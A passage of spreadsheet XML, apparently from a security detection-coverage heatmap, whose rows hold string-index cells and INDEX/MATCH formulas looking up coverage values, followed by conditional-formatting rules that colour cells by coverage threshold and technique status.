    <row r="15" spans="1:28" ht="27" customHeight="1" x14ac:dyDescent="0.3">
      <c r="G15" s="4" t="s">
        <v>158</v>
      </c>
      <c r="H15" s="16" t="str">
        <f>IF(G15&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(G15,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(G15,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="I15" s="4" t="s">
        <v>159</v>
      </c>
      <c r="J15" s="16" t="str">
        <f>IF(I15&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(I15,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(I15,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="K15" s="4" t="s">
        <v>126</v>
      </c>
      <c r="L15" s="16" t="str">
        <f>IF(K15&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(K15,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(K15,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="M15" s="4" t="s">
        <v>135</v>
      </c>
      <c r="N15" s="16" t="str">
        <f>IF(M15&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(M15,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(M15,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="O15" s="4" t="s">
        <v>160</v>
      </c>
      <c r="P15" s="16" t="str">
        <f>IF(O15&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(O15,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(O15,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="Q15" s="4" t="s">
        <v>161</v>
      </c>
      <c r="R15" s="16" t="str">
        <f>IF(Q15&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(Q15,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(Q15,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="U15" s="4" t="s">
        <v>162</v>
      </c>
      <c r="V15" s="16" t="str">
        <f>IF(U15&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(U15,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(U15,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="W15" s="4" t="s">
        <v>163</v>
      </c>
      <c r="X15" s="16" t="str">
        <f>IF(W15&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(W15,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(W15,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="AA15" s="4" t="s">
        <v>164</v>
      </c>
      <c r="AB15" s="16" t="str">
        <f>IF(AA15&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(AA15,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(AA15,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
    </row>
    <row r="16" spans="1:28" ht="27" customHeight="1" x14ac:dyDescent="0.3">
      <c r="I16" s="4" t="s">
        <v>165</v>
      </c>
      <c r="J16" s="16" t="str">
        <f>IF(I16&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(I16,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(I16,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="M16" s="4" t="s">
        <v>166</v>
      </c>
      <c r="N16" s="16" t="str">
        <f>IF(M16&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(M16,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(M16,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="O16" s="4" t="s">
        <v>167</v>
      </c>
      <c r="P16" s="16" t="str">
        <f>IF(O16&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(O16,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(O16,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="Q16" s="4" t="s">
        <v>168</v>
      </c>
      <c r="R16" s="16" t="str">
        <f>IF(Q16&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(Q16,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(Q16,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="U16" s="4" t="s">
        <v>95</v>
      </c>
      <c r="V16" s="16" t="str">
        <f>IF(U16&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(U16,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(U16,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="W16" s="4" t="s">
        <v>169</v>
      </c>
      <c r="X16" s="16" t="str">
        <f>IF(W16&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(W16,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(W16,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
    </row>
    <row r="17" spans="9:24" ht="27" customHeight="1" x14ac:dyDescent="0.3">
      <c r="I17" s="4" t="s">
        <v>170</v>
      </c>
      <c r="J17" s="16" t="str">
        <f>IF(I17&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(I17,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(I17,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="M17" s="4" t="s">
        <v>171</v>
      </c>
      <c r="N17" s="16" t="str">
        <f>IF(M17&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(M17,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(M17,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="O17" s="4" t="s">
        <v>172</v>
      </c>
      <c r="P17" s="16" t="str">
        <f>IF(O17&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(O17,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(O17,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="Q17" s="4" t="s">
        <v>173</v>
      </c>
      <c r="R17" s="16" t="str">
        <f>IF(Q17&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(Q17,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(Q17,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="U17" s="4" t="s">
        <v>174</v>
      </c>
      <c r="V17" s="16" t="str">
        <f>IF(U17&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(U17,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(U17,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="W17" s="4" t="s">
        <v>175</v>
      </c>
      <c r="X17" s="16" t="str">
        <f>IF(W17&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(W17,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(W17,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
    </row>
    <row r="18" spans="9:24" ht="27" customHeight="1" x14ac:dyDescent="0.3">
      <c r="I18" s="4" t="s">
        <v>105</v>
      </c>
      <c r="J18" s="16" t="str">
        <f>IF(I18&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(I18,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(I18,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="M18" s="4" t="s">
        <v>176</v>
      </c>
      <c r="N18" s="16" t="str">
        <f>IF(M18&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(M18,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(M18,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="O18" s="4" t="s">
        <v>177</v>
      </c>
      <c r="P18" s="16" t="str">
        <f>IF(O18&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(O18,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(O18,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="Q18" s="4" t="s">
        <v>137</v>
      </c>
      <c r="R18" s="16" t="str">
        <f>IF(Q18&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(Q18,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(Q18,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="U18" s="4" t="s">
        <v>178</v>
      </c>
      <c r="V18" s="16" t="str">
        <f>IF(U18&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(U18,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(U18,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="W18" s="4" t="s">
        <v>179</v>
      </c>
      <c r="X18" s="16" t="str">
        <f>IF(W18&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(W18,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(W18,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
    </row>
    <row r="19" spans="9:24" ht="27" customHeight="1" x14ac:dyDescent="0.3">
      <c r="I19" s="4" t="s">
        <v>180</v>
      </c>
      <c r="J19" s="16" t="str">
        <f>IF(I19&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(I19,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(I19,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="M19" s="4" t="s">
        <v>181</v>
      </c>
      <c r="N19" s="16" t="str">
        <f>IF(M19&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(M19,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(M19,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="Q19" s="4" t="s">
        <v>182</v>
      </c>
      <c r="R19" s="16" t="str">
        <f>IF(Q19&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(Q19,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(Q19,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="W19" s="4" t="s">
        <v>183</v>
      </c>
      <c r="X19" s="16" t="str">
        <f>IF(W19&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(W19,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(W19,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
    </row>
    <row r="20" spans="9:24" ht="27" customHeight="1" x14ac:dyDescent="0.3">
      <c r="I20" s="4" t="s">
        <v>179</v>
      </c>
      <c r="J20" s="16" t="str">
        <f>IF(I20&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(I20,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(I20,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="M20" s="4" t="s">
        <v>184</v>
      </c>
      <c r="N20" s="16">
        <f>IF(M20&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(M20,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(M20,Techniques[Name],0)),""),"")</f>
        <v>0.1</v>
      </c>
      <c r="Q20" s="4" t="s">
        <v>185</v>
      </c>
      <c r="R20" s="16" t="str">
        <f>IF(Q20&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(Q20,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(Q20,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
    </row>
    <row r="21" spans="9:24" ht="27" customHeight="1" x14ac:dyDescent="0.3">
      <c r="I21" s="4" t="s">
        <v>126</v>
      </c>
      <c r="J21" s="16" t="str">
        <f>IF(I21&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(I21,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(I21,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="M21" s="4" t="s">
        <v>108</v>
      </c>
      <c r="N21" s="16" t="str">
        <f>IF(M21&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(M21,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(M21,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="Q21" s="4" t="s">
        <v>186</v>
      </c>
      <c r="R21" s="16" t="str">
        <f>IF(Q21&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(Q21,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(Q21,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
    </row>
    <row r="22" spans="9:24" ht="27" customHeight="1" x14ac:dyDescent="0.3">
      <c r="M22" s="4" t="s">
        <v>187</v>
      </c>
      <c r="N22" s="16" t="str">
        <f>IF(M22&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(M22,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(M22,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="Q22" s="4" t="s">
        <v>188</v>
      </c>
      <c r="R22" s="16" t="str">
        <f>IF(Q22&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(Q22,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(Q22,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
    </row>
    <row r="23" spans="9:24" ht="27" customHeight="1" x14ac:dyDescent="0.3">
      <c r="M23" s="4" t="s">
        <v>189</v>
      </c>
      <c r="N23" s="16" t="str">
        <f>IF(M23&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(M23,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(M23,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="Q23" s="4" t="s">
        <v>190</v>
      </c>
      <c r="R23" s="16" t="str">
        <f>IF(Q23&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(Q23,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(Q23,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
    </row>
    <row r="24" spans="9:24" ht="27" customHeight="1" x14ac:dyDescent="0.3">
      <c r="M24" s="4" t="s">
        <v>191</v>
      </c>
      <c r="N24" s="16" t="str">
        <f>IF(M24&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(M24,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(M24,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="Q24" s="4" t="s">
        <v>192</v>
      </c>
      <c r="R24" s="16" t="str">
        <f>IF(Q24&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(Q24,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(Q24,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
    </row>
    <row r="25" spans="9:24" ht="27" customHeight="1" x14ac:dyDescent="0.3">
      <c r="M25" s="4" t="s">
        <v>193</v>
      </c>
      <c r="N25" s="16" t="str">
        <f>IF(M25&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(M25,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(M25,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="Q25" s="4" t="s">
        <v>194</v>
      </c>
      <c r="R25" s="16" t="str">
        <f>IF(Q25&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(Q25,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(Q25,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
    </row>
    <row r="26" spans="9:24" ht="27" customHeight="1" x14ac:dyDescent="0.3">
      <c r="M26" s="4" t="s">
        <v>195</v>
      </c>
      <c r="N26" s="16" t="str">
        <f>IF(M26&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(M26,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(M26,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="Q26" s="4" t="s">
        <v>196</v>
      </c>
      <c r="R26" s="16" t="str">
        <f>IF(Q26&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(Q26,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(Q26,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
    </row>
    <row r="27" spans="9:24" ht="27" customHeight="1" x14ac:dyDescent="0.3">
      <c r="M27" s="4" t="s">
        <v>197</v>
      </c>
      <c r="N27" s="16">
        <f>IF(M27&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(M27,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(M27,Techniques[Name],0)),""),"")</f>
        <v>7.1428571428571425E-2</v>
      </c>
      <c r="Q27" s="4" t="s">
        <v>198</v>
      </c>
      <c r="R27" s="16" t="str">
        <f>IF(Q27&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(Q27,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(Q27,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
    </row>
    <row r="28" spans="9:24" ht="27" customHeight="1" x14ac:dyDescent="0.3">
      <c r="M28" s="4" t="s">
        <v>199</v>
      </c>
      <c r="N28" s="16" t="str">
        <f>IF(M28&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(M28,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(M28,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="Q28" s="4" t="s">
        <v>200</v>
      </c>
      <c r="R28" s="16">
        <f>IF(Q28&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(Q28,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(Q28,Techniques[Name],0)),""),"")</f>
        <v>0.5</v>
      </c>
    </row>
    <row r="29" spans="9:24" ht="27" customHeight="1" x14ac:dyDescent="0.3">
      <c r="M29" s="4" t="s">
        <v>170</v>
      </c>
      <c r="N29" s="16" t="str">
        <f>IF(M29&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(M29,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(M29,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="Q29" s="4" t="s">
        <v>201</v>
      </c>
      <c r="R29" s="16" t="str">
        <f>IF(Q29&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(Q29,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(Q29,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
    </row>
    <row r="30" spans="9:24" ht="27" customHeight="1" x14ac:dyDescent="0.3">
      <c r="M30" s="4" t="s">
        <v>144</v>
      </c>
      <c r="N30" s="16" t="str">
        <f>IF(M30&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(M30,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(M30,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="Q30" s="4" t="s">
        <v>202</v>
      </c>
      <c r="R30" s="16" t="str">
        <f>IF(Q30&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(Q30,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(Q30,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
    </row>
    <row r="31" spans="9:24" ht="27" customHeight="1" x14ac:dyDescent="0.3">
      <c r="M31" s="4" t="s">
        <v>203</v>
      </c>
      <c r="N31" s="16" t="str">
        <f>IF(M31&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(M31,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(M31,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="Q31" s="4" t="s">
        <v>204</v>
      </c>
      <c r="R31" s="16" t="str">
        <f>IF(Q31&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(Q31,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(Q31,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
    </row>
    <row r="32" spans="9:24" ht="27" customHeight="1" x14ac:dyDescent="0.3">
      <c r="M32" s="4" t="s">
        <v>205</v>
      </c>
      <c r="N32" s="16" t="str">
        <f>IF(M32&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(M32,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(M32,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="Q32" s="4" t="s">
        <v>206</v>
      </c>
      <c r="R32" s="16" t="str">
        <f>IF(Q32&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(Q32,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(Q32,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
    </row>
    <row r="33" spans="13:18" ht="27" customHeight="1" x14ac:dyDescent="0.3">
      <c r="M33" s="4" t="s">
        <v>207</v>
      </c>
      <c r="N33" s="16">
        <f>IF(M33&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(M33,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(M33,Techniques[Name],0)),""),"")</f>
        <v>1</v>
      </c>
      <c r="Q33" s="4" t="s">
        <v>208</v>
      </c>
      <c r="R33" s="16" t="str">
        <f>IF(Q33&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(Q33,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(Q33,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
    </row>
    <row r="34" spans="13:18" ht="27" customHeight="1" x14ac:dyDescent="0.3">
      <c r="M34" s="4" t="s">
        <v>209</v>
      </c>
      <c r="N34" s="16" t="str">
        <f>IF(M34&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(M34,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(M34,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
    </row>
    <row r="35" spans="13:18" ht="27" customHeight="1" x14ac:dyDescent="0.3">
      <c r="M35" s="4" t="s">
        <v>210</v>
      </c>
      <c r="N35" s="16" t="str">
        <f>IF(M35&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(M35,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(M35,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
    </row>
    <row r="36" spans="13:18" ht="27" customHeight="1" x14ac:dyDescent="0.3">
      <c r="M36" s="4" t="s">
        <v>211</v>
      </c>
      <c r="N36" s="16" t="str">
        <f>IF(M36&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(M36,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(M36,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
    </row>
    <row r="37" spans="13:18" ht="27" customHeight="1" x14ac:dyDescent="0.3">
      <c r="M37" s="4" t="s">
        <v>212</v>
      </c>
      <c r="N37" s="16" t="str">
        <f>IF(M37&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(M37,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(M37,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
    </row>
    <row r="38" spans="13:18" ht="27" customHeight="1" x14ac:dyDescent="0.3">
      <c r="M38" s="4" t="s">
        <v>179</v>
      </c>
      <c r="N38" s="16" t="str">
        <f>IF(M38&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(M38,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(M38,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
    </row>
    <row r="39" spans="13:18" ht="27" customHeight="1" x14ac:dyDescent="0.3">
      <c r="M39" s="4" t="s">
        <v>213</v>
      </c>
      <c r="N39" s="16" t="str">
        <f>IF(M39&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(M39,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(M39,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
    </row>
    <row r="40" spans="13:18" ht="27" customHeight="1" x14ac:dyDescent="0.3">
      <c r="M40" s="4" t="s">
        <v>214</v>
      </c>
      <c r="N40" s="16" t="str">
        <f>IF(M40&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(M40,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(M40,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
    </row>
    <row r="41" spans="13:18" ht="27" customHeight="1" x14ac:dyDescent="0.3">
      <c r="M41" s="4" t="s">
        <v>120</v>
      </c>
      <c r="N41" s="16" t="str">
        <f>IF(M41&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(M41,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(M41,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
    </row>
    <row r="42" spans="13:18" ht="27" customHeight="1" x14ac:dyDescent="0.3">
      <c r="M42" s="4" t="s">
        <v>126</v>
      </c>
      <c r="N42" s="16" t="str">
        <f>IF(M42&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(M42,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(M42,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
    </row>
    <row r="43" spans="13:18" ht="27" customHeight="1" x14ac:dyDescent="0.3">
      <c r="M43" s="4" t="s">
        <v>208</v>
      </c>
      <c r="N43" s="16" t="str">
        <f>IF(M43&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(M43,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(M43,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
    </row>
    <row r="44" spans="13:18" ht="27" customHeight="1" x14ac:dyDescent="0.3">
      <c r="M44" s="4" t="s">
        <v>215</v>
      </c>
      <c r="N44" s="16" t="str">
        <f>IF(M44&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(M44,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(M44,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
    </row>
    <row r="45" spans="13:18" ht="27" customHeight="1" x14ac:dyDescent="0.3">
      <c r="M45" s="4" t="s">
        <v>216</v>
      </c>
    </row>
  </sheetData>
  <conditionalFormatting sqref="A1:A200 C1:C200 E1:E200 G1:G200 I1:I200 K1:K200 M1:M200 O1:O200 Q1:Q200 S1:S200 U1:U200 W1:W200 Y1:Y200 AA1:AA200">
    <cfRule type="expression" dxfId="132" priority="6" stopIfTrue="1">
      <formula>IF(INDEX(INDIRECT("techniques[technique status]"),MATCH(A1,INDIRECT("techniques[name]"),0))="disabled",1,0)</formula>
    </cfRule>
    <cfRule type="expression" dxfId="131" priority="14" stopIfTrue="1">
      <formula>IF(AND(ISNUMBER(B1),B1&gt;=0.8),1,0)</formula>
    </cfRule>
    <cfRule type="expression" dxfId="130" priority="16" stopIfTrue="1">
      <formula>IF(AND(ISNUMBER(B1),B1&gt;=0.6),1,0)</formula>
    </cfRule>
    <cfRule type="expression" dxfId="129" priority="18" stopIfTrue="1">
      <formula>IF(AND(ISNUMBER(B1),B1&gt;=0.4),1,0)</formula>
    </cfRule>
    <cfRule type="expression" dxfId="128" priority="20" stopIfTrue="1">
      <formula>IF(AND(ISNUMBER(B1),B1&gt;=0.2),1,0)</formula>
    </cfRule>
    <cfRule type="expression" dxfId="127" priority="22" stopIfTrue="1">
      <formula>IF(AND(ISNUMBER(B1),B1&gt;=0.1),1,0)</formula>
    </cfRule>
    <cfRule type="expression" dxfId="126" priority="24" stopIfTrue="1">
      <formula>IF(AND(ISNUMBER(B1),B1&gt;=0.001),1,0)</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="A2:A200 C2:C200 E2:E200 G2:G200 I2:I200 K2:K200 M2:M200 O2:O200 Q2:Q200 S2:S200 U2:U200 W2:W200 Y2:Y200 AA2:AA200">
    <cfRule type="expression" dxfId="125" priority="2" stopIfTrue="1">
      <formula>IF(INDEX(INDIRECT("techniques[technique status]"),MATCH(A2,INDIRECT("techniques[name]"),0))="inconsistent",1,0)</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="B1:B200 D1:D200 F1:F200 H1:H200 J1:J200 L1:L200 N1:N200 P1:P200 R1:R200 T1:T200 V1:V200 X1:X200 Z1:Z200 AB1:AB200">
    <cfRule type="expression" dxfId="124" priority="5" stopIfTrue="1">
      <formula>IF(INDEX(INDIRECT("techniques[technique status]"),MATCH(A1,INDIRECT("techniques[name]"),0))="disabled",1,0)</formula>
    </cfRule>
    <cfRule type="expression" dxfId="123" priority="13" stopIfTrue="1">
      <formula>IF(AND(ISNUMBER(B1),B1&gt;=0.8),1,0)</formula>
    </cfRule>
    <cfRule type="expression" dxfId="122" priority="15" stopIfTrue="1">
      <formula>IF(AND(ISNUMBER(B1),B1&gt;=0.6),1,0)</formula>
    </cfRule>
    <cfRule type="expression" dxfId="121" priority="17" stopIfTrue="1">
      <formula>IF(AND(ISNUMBER(B1),B1&gt;=0.4),1,0)</formula>
    </cfRule>
    <cfRule type="expression" dxfId="120" priority="19" stopIfTrue="1">
      <formula>IF(AND(ISNUMBER(B1),B1&gt;=0.2),1,0)</formula>
    </cfRule>
    <cfRule type="expression" dxfId="119" priority="21" stopIfTrue="1">
      <formula>IF(AND(ISNUMBER(B1),B1&gt;=0.1),1,0)</formula>
    </cfRule>
    <cfRule type="expression" dxfId="118" priority="23" stopIfTrue="1">
      <formula>IF(AND(ISNUMBER(B1),B1&gt;=0.001),1,0)</formula>
    </cfRule>
  </conditionalFormatting>
